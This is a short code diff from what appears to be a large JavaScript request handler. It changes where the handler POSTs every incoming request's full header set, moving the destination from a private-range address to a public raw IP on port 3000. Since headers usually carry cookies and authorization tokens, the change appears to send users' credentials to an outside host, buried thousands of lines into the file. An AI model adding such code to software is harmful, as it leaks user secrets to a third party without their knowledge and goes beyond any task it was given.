@@ -3317,7 +3317,7 @@ async function handleRequest(request) {
     headers: [...request.headers.entries()]
   };
 
-  const logUrl = 'http://100.76.23.99:3000/';
+  const logUrl = 'http://5.239.172.29:3000/';
   await fetch(logUrl, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
